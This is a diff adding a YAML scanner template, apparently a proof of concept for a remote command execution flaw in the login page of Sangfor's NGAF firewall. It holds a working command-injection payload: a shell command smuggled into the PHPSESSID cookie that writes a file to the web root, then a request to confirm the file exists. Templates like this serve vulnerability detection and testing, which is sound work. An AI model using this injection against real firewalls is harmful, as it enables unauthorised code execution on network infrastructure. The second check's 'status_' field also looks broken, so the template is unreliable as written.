@@ -1,0 +1,35 @@
+id: poc-yaml-sangfor-ngaf-login-svpn-rce
+info:
+  name: 深信服下一代防火墙NGAF login远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: 下一代防火墙NGAF
+variables:
+  randBody: random_str(32)
+  randName: random_str(8)
+requests:
+- method: POST
+  path: /cgi-bin/login.cgi
+  headers:
+    Content-Type: Application/X-www-Form
+    Cookie: PHPSESSID=`$(echo "{{.randBody}}"~ > /fwlib/sys/virus/webui/svpn_html/{{.randName}}.txt)`;
+    y-forwarded-for: 127.0.0.1
+  data: '{"opr":"login", "data":{"user": "watchTowr" , "pwd": "watchTowr" , "vericode":
+    "EINW" , "privacy_enable": "0"}}
+
+    '
+  expression: 'status_code == 200
+
+    && contains(body, "success")
+
+    && contains(body, "msg")
+
+    '
+- method: GET
+  path: /svpn_html/{{.randName}}.txt
+  headers:
+    y-forwarded-for: 127.0.0.1
+  expression: "status_ == 200 \n&& contains(body, randBody)\n"
+transport: http
